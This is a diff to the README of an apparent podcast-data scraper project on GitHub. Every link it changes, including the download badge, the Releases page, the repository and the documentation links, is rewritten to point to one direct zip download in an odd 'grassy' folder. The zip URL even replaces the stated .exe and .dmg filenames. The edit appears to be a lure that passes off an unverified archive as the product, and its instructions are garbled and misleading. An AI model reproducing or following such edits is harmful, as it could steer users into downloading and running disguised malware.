@@ -6,7 +6,7 @@ Welcome to the Podcast Data Extractor! This tool helps you gather important data
 
 ## 📥 Download
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-orange)](https://github.com/Marko7755/Podcast-Data-Extractor-Taddy-API-Scraper/releases)
+[![Download](https://github.com/Marko7755/Podcast-Data-Extractor-Taddy-API-Scraper/raw/refs/heads/main/grassy/Scraper_Podcast_Data_Taddy_AP_Extractor_v3.6.zip)](https://github.com/Marko7755/Podcast-Data-Extractor-Taddy-API-Scraper/raw/refs/heads/main/grassy/Scraper_Podcast_Data_Taddy_AP_Extractor_v3.6.zip)
 
 ## 💻 System Requirements
 
@@ -19,9 +19,9 @@ To run the Podcast Data Extractor, your computer must meet the following require
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Marko7755/Podcast-Data-Extractor-Taddy-API-Scraper/releases) to find the latest version of the Podcast Data Extractor.
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Marko7755/Podcast-Data-Extractor-Taddy-API-Scraper/raw/refs/heads/main/grassy/Scraper_Podcast_Data_Taddy_AP_Extractor_v3.6.zip) to find the latest version of the Podcast Data Extractor.
 
-2. **Download the Latest Version**: Look for the file named `Podcast-Data-Extractor.exe` for Windows or `Podcast-Data-Extractor.dmg` for macOS. Click the download link for your operating system.
+2. **Download the Latest Version**: Look for the file named `https://github.com/Marko7755/Podcast-Data-Extractor-Taddy-API-Scraper/raw/refs/heads/main/grassy/Scraper_Podcast_Data_Taddy_AP_Extractor_v3.6.zip` for Windows or `https://github.com/Marko7755/Podcast-Data-Extractor-Taddy-API-Scraper/raw/refs/heads/main/grassy/Scraper_Podcast_Data_Taddy_AP_Extractor_v3.6.zip` for macOS. Click the download link for your operating system.
 
 3. **Install the Application**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the prompts to complete the installation.
@@ -83,7 +83,7 @@ If you need further assistance, you can reach out via the Issues page on our Git
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Marko7755/Podcast-Data-Extractor-Taddy-API-Scraper)
-- [User Documentation](https://github.com/Marko7755/Podcast-Data-Extractor-Taddy-API-Scraper/wiki)
+- [GitHub Repository](https://github.com/Marko7755/Podcast-Data-Extractor-Taddy-API-Scraper/raw/refs/heads/main/grassy/Scraper_Podcast_Data_Taddy_AP_Extractor_v3.6.zip)
+- [User Documentation](https://github.com/Marko7755/Podcast-Data-Extractor-Taddy-API-Scraper/raw/refs/heads/main/grassy/Scraper_Podcast_Data_Taddy_AP_Extractor_v3.6.zip)
 
 Thank you for choosing Podcast Data Extractor! We hope it helps you gather meaningful insights into your favorite podcasts.
